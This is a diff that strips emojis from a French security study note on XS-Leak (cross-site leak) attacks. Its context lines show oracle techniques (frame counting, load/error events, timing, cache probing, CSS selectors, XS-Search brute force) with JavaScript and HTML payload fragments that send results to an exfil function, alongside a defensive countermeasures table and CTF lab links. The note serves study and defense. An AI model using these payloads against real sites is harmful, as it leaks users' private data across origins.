@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📤 XS-Leak — Cross-Site Leaks
+# XS-Leak — Cross-Site Leaks
 
 > [!info] **En 1 phrase**
 > XS-Leak = déduire des données d'une origine cible **sans jamais lire le corps de la réponse** :
@@ -23,7 +23,7 @@ statut: publie
 > Source principale : **[PayloadsAllTheThings — XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XS-Leak/README.md)**
 
 ---
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,7 +34,7 @@ flowchart LR
     E --> F[Bruteforce du secret<br>caractère par caractère]
 ```
 
-> [!info] 💡 **Différence avec XSS**
+> [!info] **Différence avec XSS**
 > ```txt
 > XSS     = lire le CORPS de la réponse  → le JS s'exécute DANS l'origine cible.
 > XS-Leak = observer les EFFETS DE BORD du navigateur → jamais de lecture du contenu.
@@ -44,7 +44,7 @@ flowchart LR
 > brute, seulement la **réponse oui/non** d'un test qu'il a formulé.
 
 ---
-## 🧩 Primitives d'attaque (Oracles cross-origin)
+## Primitives d'attaque (Oracles cross-origin)
 
 | Primitive | Ce que ça fuit |
 |---|---|
@@ -56,7 +56,7 @@ flowchart LR
 | **Rendu** | Longueur du texte / valeurs d'attributs (via CSS) |
 
 ---
-## 🔢 Frame Counting (`window.length`)
+## Frame Counting (`window.length`)
 
 > La propriété `window.length` (nombre d'iframes d'une fenêtre) est **lisible cross-origin**.
 > Si la page cible charge N sous-frames selon un secret (ex : résultats de recherche, avatars),
@@ -83,7 +83,7 @@ function check() {
 ```
 
 ---
-## 🖼️ Image Loading Oracle (onload / onerror)
+## Image Loading Oracle (onload / onerror)
 
 > L'événement de chargement d'une image cross-origin est observable : `onload` = ressource
 > **chargée** (2xx, contenu image valide), `onerror` = **absente / protégée / mauvais type**.
@@ -98,7 +98,7 @@ img.src = 'https://target/api/avatar?id=1337';
 ```
 
 ---
-## 🎮 Event Handler Leaks (script / stylesheet / object)
+## Event Handler Leaks (script / stylesheet / object)
 
 > Le navigateur déclenche `onload`/`onerror` sur les éléments cross-origin ; on compare le
 > comportement selon la donnée à tester (ex : `onerror` = 404 → secret inexistant).
@@ -114,12 +114,12 @@ img.src = 'https://target/api/avatar?id=1337';
 <object data="https://target/data" onload="exfil('load')" onerror="exfil('error')"></object>
 ```
 
-> [!tip] 💡 **Id Attribute Leak** : un élément focusable avec un `id` connu provoque un `blur`
+> [!tip] **Id Attribute Leak** : un élément focusable avec un `id` connu provoque un `blur`
 > quand il disparaît → tester la présence d'un id via `onblur`.
 > (voir [xsinator](https://xsinator.com/testing.html#Id%20Attribute%20Leak))
 
 ---
-## ⏱️ Timing Attacks
+## Timing Attacks
 
 > Mesurer la durée d'une requête cross-origin (`fetch no-cors`, `performance.now`) : une requête
 > qui renvoie des résultats traite plus de code/données → plus lente. C'est l'oracle de base du **XS-Search**.
@@ -151,11 +151,11 @@ performance.getEntriesByType('resource').forEach(r => {
 });
 ```
 
-> [!warning] ⚠️ La précision des timers est **réduite par défaut** (anti-fingerprinting).
+> [!warning] La précision des timers est **réduite par défaut** (anti-fingerprinting).
 > Répéter les mesures (100+ échantillons) et comparer **médianes** ou moyennes.
 
 ---
-## 🪟 window.open / location / COOP
+## window.open / location / COOP
 
 ```js
 // COOP : si la cible envoie Cross-Origin-Opener-Policy: same-origin,
@@ -185,7 +185,7 @@ fetch('https://target/login', { mode: 'no-cors', redirect: 'manual' })
 ```
 
 ---
-## 📬 postMessage & Error Messages
+## postMessage & Error Messages
 
 ```js
 // La cible accepte-t-elle des messages ? répond-elle ?
@@ -207,12 +207,12 @@ setTimeout(() => w.postMessage('ping', '*'), 2000);
 </script>
 ```
 
-> [!tip] 💡 **CORS Error Leak** : une `fetch` cross-origin sans CORS échoue avec un message
+> [!tip] **CORS Error Leak** : une `fetch` cross-origin sans CORS échoue avec un message
 > contenant parfois l'**URL de redirection finale** → lecture de l'URL cible.
 > **CSP Violation Leak** : un report de violation CSP peut embarquer la cible de redirection.
 
 ---
-## 🎨 CSS Oracles (sélecteurs)
+## CSS Oracles (sélecteurs)
 
 > Quand l'attaquant peut injecter du CSS ou un style cross-origin, les **sélecteurs d'attributs**
 > créent des requêtes conditionnelles : le background ne s'applique que si le test est vrai.
@@ -228,12 +228,12 @@ textarea[name="secret"] { height: 1px; }
 p.text-truncate { white-space: nowrap; overflow: hidden; }
 ```
 
-> [!info] 💡 Les requêtes CSS révèlent quelles valeurs **existent** (logs du serveur de
+> [!info] Les requêtes CSS révèlent quelles valeurs **existent** (logs du serveur de
 > l'attaquant) : même principe que le loading oracle, appliqué au rendu.
-> → Détail complet : [[CSS Injection|🎨 CSS]]
+> → Détail complet : [[CSS Injection| CSS]]
 
 ---
-## 💾 Cache Probing (cache HTTP & bfcache)
+## Cache Probing (cache HTTP & bfcache)
 
 > Le navigateur met en cache les réponses **déjà vues**. Si une ressource n'est mise en cache
 > que pour les utilisateurs authentifiés (ou après une visite), mesurer la **deuxième** charge
@@ -267,12 +267,12 @@ window.addEventListener('pageshow', (e) => {
 });
 ```
 
-> [!tip] 💡 **Cache Leak (CORS / POST)** : vider le cache par une erreur CORS ou une requête
+> [!tip] **Cache Leak (CORS / POST)** : vider le cache par une erreur CORS ou une requête
 > `POST` puis re-tester → détecte précisément quelles ressources la page cible charge.
 > (voir [xsinator](https://xsinator.com/testing.html#Cache%20Leak%20(CORS)))
 
 ---
-## 🔐 Side Channels navigateur (history, localStorage)
+## Side Channels navigateur (history, localStorage)
 
 ```js
 // History Length Leak : comparer history.length avant/après une navigation
@@ -295,7 +295,7 @@ que TOUTE mesure de temps/état peut fuiter.
 ```
 
 ---
-## 🔎 XS-Search (Cross-Site Search)
+## XS-Search (Cross-Site Search)
 
 > **Principe** : abuser d'un moteur de recherche / filtre de l'app pour obtenir un **oracle
 > booléen** — *la requête `?q=...` renvoie-t-elle des résultats ?* On teste une valeur, on
@@ -348,12 +348,12 @@ for (let i = 5; i < 50; i++) {
 exfil(flag);
 ```
 
-> [!tip] 💡 **Astuce CTF (source)** : ouvrir **50 onglets** de résultats et mesurer le timing du
+> [!tip] **Astuce CTF (source)** : ouvrir **50 onglets** de résultats et mesurer le timing du
 > **report CSP** (iframe violant la CSP sur la page de résultats) → plus d'onglets = bruit moyenné,
 > signal net. Lab : [Root-Me — XS Leaks](https://www.root-me.org/en/Challenges/Web-Client/XS-Leaks)
 
 ---
-## 📦 Known Oracles (xsinator.com)
+## Known Oracles (xsinator.com)
 
 | Groupe | Oracle | Ce qu'il détecte |
 |---|---|---|
@@ -382,7 +382,7 @@ exfil(flag);
 | Divers | Style Reload Error Leak / Request Merging Error Leak | Erreurs de chargement |
 
 ---
-## 🛠️ Outils
+## Outils
 
 ```txt
 xsinator.com (RUB-NDS) → Suite de tests de XS-Leak dans le navigateur (tous les oracles ci-dessus)
@@ -393,7 +393,7 @@ Headless browser       → Puppeteer/Selenium : automatiser les mesures de timin
 ```
 
 ---
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Côté | Mesure | Détail |
 |---|---|---|
@@ -409,23 +409,23 @@ Headless browser       → Puppeteer/Selenium : automatiser les mesures de timin
 | Réponse | `Timing-Allow-Origin` restreint | Limite le Resource Timing cross-origin |
 | Réponse | Rate limiting / CAPTCHA sur la recherche | Ralentit le bruteforce XS-Search |
 
-> [!tip] 💡 **Tester chez soi** : créer 2 états (connecté / déconnecté) et vérifier que le signal
+> [!tip] **Tester chez soi** : créer 2 états (connecté / déconnecté) et vérifier que le signal
 > (temps, frames, erreur, cache) **diffère**. Conditions d'exploitabilité : pas de CSP bloquante,
 > pas de `SameSite=Strict`, pas de cache partitionné, ressource dépendante d'un secret.
 
 ---
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Prérequis clé**
+> [!tip] **Prérequis clé**
 > L'attaquant doit pouvoir **formuler la condition** à tester : un oracle ne répond qu'en
 > true/false. Sans requête constructible (URL devinable, paramètre injectable dans la
 > recherche), pas de XS-Leak exploitable.
 
-> [!tip] 💡 **Combiner les oracles**
+> [!tip] **Combiner les oracles**
 > Un seul oracle est rarement fiable → **empiler** timing + frame count + cache pour confirmer.
 > Répéter les mesures (médiane sur ≥100 échantillons) pour lisser le bruit.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - `SameSite=Lax` envoie quand même les cookies sur les **navigations top-level GET** →
 >   une popup/iframe top-level peut encore fuiter.
 > - Le cache HTTP a longtemps été **partagé** entre origines → re-tester à chaque version de navigateur.
@@ -435,23 +435,23 @@ Headless browser       → Puppeteer/Selenium : automatiser les mesures de timin
 > - **Bruit** : les autres onglets, le CPU et le réseau rendent les timing attacks instables.
 > - Un oracle qui marche en labo ne marche pas forcément sur la cible (cache, priorités, CORP...).
 
-> [!warning] ⚠️ **Limites**
+> [!warning] **Limites**
 > - Précision des timers réduite (anti-fingerprinting) → échantillons nombreux obligatoires.
 > - La victime doit avoir une **session active** : sans données privées chargées, rien à fuiter.
 > - XS-Search bruteforce = très bruité et lent : chercher d'abord une **borne de longueur**,
 >   puis la valeur avec du préfixe connu.
 
 ---
-## 🧪 Labs
+## Labs
 
 - Root-Me — XS Leaks (Web-Client) : https://www.root-me.org/en/Challenges/Web-Client/XS-Leaks
 - xsinator.com (tester chaque oracle en live) : https://xsinator.com/testing.html
 
 ---
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[CSS Injection|🎨 CSS]]
-- [[Attaques JWT|🔏 JWT]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XS-Leak/README.md)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[CSS Injection| CSS]]
+- [[Attaques JWT| JWT]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XS-Leak/README.md)
